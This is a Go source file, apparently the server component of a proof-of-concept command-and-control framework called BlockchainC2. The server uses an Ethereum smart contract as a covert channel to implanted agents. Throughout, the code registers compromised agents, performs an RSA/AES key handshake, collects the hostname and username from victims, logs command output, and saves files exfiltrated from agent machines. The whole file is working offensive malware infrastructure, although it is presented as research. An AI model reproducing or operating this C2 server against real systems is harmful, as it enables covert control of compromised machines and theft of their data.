package main

import (
	"blockchainc2/internal/pkg/BlockchainC2"
	"blockchainc2/internal/pkg/Utils"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"time"
)

// Config contains execution options for our server
type Config struct {
	Key             string `json:"Key"`
	Endpoint        string `json:"Endpoint"`
	ContractAddress string `json:"ContractAddress"`
	GasPrice        int    `json:"GasPrice"`
}

// updateLastSeen updates the agents last seen time
func updateLastSeen(c2 *BlockchainC2.BlockchainServer, agentID string) {
	if agent := c2.GetAgentByID(agentID); agent != nil {
		agent.LastSeen = time.Now().Format("2006-01-02 15:04:05")
	}
}

// handleAgentPing receives a ping from an agent to update its last seen time (deprecated)
func handleAgentPing(c2 *BlockchainC2.BlockchainServer, data string, agentID string) {
	updateLastSeen(c2, agentID)
}

// handleFileDownload handles data provided by an agent when downloading a file
// data provided is Base64 encoded by the agent
func handleFileDownload(c2 *BlockchainC2.BlockchainServer, data string, agentID string) {

	if agent := c2.GetAgentByID(agentID); agent != nil {

		// TODO: Handle filename from the initial request
		// Currently this will store the file contents to a random filename
		outFilename := BlockchainC2.RandStringBytes(15) + ".downloaded"

		// Decode Base64 encoded file contents
		decoded, err := base64.URLEncoding.DecodeString(data)
		if err != nil {
			appendToLog(agent, fmt.Sprintf("An error occurred decoded base64 contents of file download: %v", err))
			return
		}

		// Write downloaded file contents locally
		if err := ioutil.WriteFile(outFilename, decoded, 0600); err != nil {
			appendToLog(agent, fmt.Sprintf("An error occurred saving file: %v", err))
			return
		}

		appendToLog(agent, fmt.Sprintf("File successfully downloaded to %s", outFilename))
	}
}

// handleAgentInfo handles a response from the agent for additional details on the agents execution
// such as the hostname and current username
func handleAgentInfo(c2 *BlockchainC2.BlockchainServer, data string, agentID string) {
	if agent := c2.GetAgentByID(agentID); agent != nil {

		// Parse the response into an AgentInfoMsg object
		var msg BlockchainC2.AgentInfoMsg
		Utils.FromJSONString(data, &msg)

		// Update agent information
		agent.CurrentUser = msg.Username
		agent.Hostname = msg.Hostname

		// Set the agent status to ready to allow commands to be sent
		agent.Status = BlockchainC2.Running
	}
}

// handleAgentJoin handles is the first call made to the server when an agent checks-in for the first time
func handleAgentJoin(c2 *BlockchainC2.BlockchainServer, data string, agentID string) {
	if agent := c2.GetAgentByID(agentID); agent == nil {

		// Create a new agent if one with the current AgentID doesn't exist
		c2.GetOrCreateAgent(agentID)
	}

	agent := c2.GetAgentByID(agentID)

	// Send out public key to the connected agent
	rsaKey := Utils.AsymmetricKeyToString(&c2.Crypto.PublicKey)
	if err := c2.SendToAgent(agentID, string(rsaKey), BlockchainC2.ServerToAgentCryptoHandshake, false); err != nil {
		appendToLog(agent, fmt.Sprintf("Error sending cryptokey to agent: %v", err))
		return
	}
}

// handleDataOutput handles data provided from a command execution on the agent side
func handleDataOutput(c2 *BlockchainC2.BlockchainServer, data string, agentID string) {
	if agent := c2.GetAgentByID(agentID); agent != nil {
		appendToLog(agent, fmt.Sprintf("Command output: %s\n", data))
	}
}

// handleCryptoHandshake parses data passed from client which contains session key encrypted with our RSA public key
// data parameter is base64 encoded
func handleCryptoHandshake(c2 *BlockchainC2.BlockchainServer, data string, agentID string) {

	// Base64 decode the RSA encrypted AES key
	encSessionKey, _ := base64.URLEncoding.DecodeString(data)

	// Decrypt the session key using our RSA private key
	sessionKey, _ := Utils.AsymmetricDecrypt(encSessionKey, c2.Crypto)

	if agent := c2.GetAgentByID(agentID); agent != nil {

		// Set the session key for this agent
		agent.SessionKey = sessionKey

		// Request agent information now we can encrypt data
		if err := c2.SendToAgent(agentID, "", BlockchainC2.ServerToAgentInfo, true); err != nil {
			appendToLog(agent, fmt.Sprintf("Error sending Agent Info request to agent: %v", err))
			return
		}
	}
}

// printIntro displays our intro on agent startup
func printIntro() {
	fmt.Printf(`
	/$$$$$$$   /$$$$$$   /$$$$$$ 
	| $$__  $$ /$$__  $$ /$$__  $$
	| $$  \ $$| $$  \__/|__/  \ $$
	| $$$$$$$ | $$        /$$$$$$/
	| $$__  $$| $$       /$$____/ 
	| $$  \ $$| $$    $$| $$      
	| $$$$$$$/|  $$$$$$/| $$$$$$$$
	|_______/  \______/ |________/
	
	 BlockchainC2 Server
	 POC by @_xpn_
								  
								  
`)
}

// startSetup handles a --setup request from the command line by creating a smart contract
// on the blockchain
func startSetup(key, password, endpoint string) {
	fmt.Println("[*] Deploying Smart Contract...")
	addr := BlockchainC2.DeployContract(key, password, endpoint)
	fmt.Println("[*] Smart Contract deployed at address: ", addr)
}

func main() {

	var config Config

	// Display our intro
	printIntro()

	// Parse the provided arguments
	setupOption := flag.Bool("setup", false, "Start in \"setup\" mode")
	configPath := flag.String("config", "./config.json", "The path to config.json")
	cryptPassword := flag.String("pass", "", "Password to decrypt key provided in config.json")
	nonceValue := flag.Int64("nonce", int64(-1), "Nonce value or last transaction ID. ")
	flag.Parse()

	// Ensure that a password is provided to decrypt the provided keychain
	if *cryptPassword == "" {
		flag.PrintDefaults()
		return
	}

	// Read the JSON config file containing our options
	configContents, err := ioutil.ReadFile(*configPath)
	if err != nil {
		fmt.Println("[!] Error Reading Config: ", err)
		return
	}

	// Deserialize the config contents
	if err := json.Unmarshal(configContents, &config); err != nil {
		fmt.Println("[!] Error Parsing Config: ", err)
		return
	}

	Key := config.Key
	Endpoint := config.Endpoint
	ContractAddress := config.ContractAddress
	GasPrice := config.GasPrice

	// Start contract setup if option provided on command line
	if *setupOption {
		startSetup(Key, *cryptPassword, Endpoint)
		return
	}

	// Create our Blockchain server instance
	client, err := BlockchainC2.CreateBlockchainServer(Key, *cryptPassword, Endpoint, ContractAddress, int64(GasPrice), *nonceValue)
	if err != nil {
		fmt.Println("[!] Error creating connection to blockchain: ", err)
		return
	}

	// Start our UI handlers
	uiChannelIn := make(chan string)
	uiChannelOut := make(chan UIChannelMsg)
	go startConsole(client, uiChannelIn, uiChannelOut)
	go handleConsole(client, uiChannelIn, uiChannelOut)

	// Start our receiving loop
	blockchainChan := make(chan BlockchainC2.BlockchainC2)
	go client.RecvFromAgentLoop(blockchainChan)

	// After this point, all diagnostic data needs passing to the UI

	// Our C2 loop
	for true {
		event := <-blockchainChan

		switch event.MsgID {

		// Agent Ping
		case BlockchainC2.AgentToServerPing:
			//handleAgentPing(client, event.Data, event.AgentID)

		// Agent Join
		case BlockchainC2.AgentToServerJoin:
			handleAgentJoin(client, event.Data, event.AgentID)

		// Data output
		case BlockchainC2.AgentToServerData:
			handleDataOutput(client, event.Data, event.AgentID)

		// Transfer of agent information
		case BlockchainC2.AgentToServerInfo:
			handleAgentInfo(client, event.Data, event.AgentID)

		// Handle file download
		case BlockchainC2.AgentToServerFileDownload:
			handleFileDownload(client, event.Data, event.AgentID)

		// Receives agent session keys
		case BlockchainC2.AgentToServerCryptoHandshake:
			handleCryptoHandshake(client, event.Data, event.AgentID)
		}

		// Update the last-seen time of the agent
		updateLastSeen(client, event.AgentID)

		// Trigger a UI refresh for our agent
		uiChannelIn <- "Refresh"
	}
}
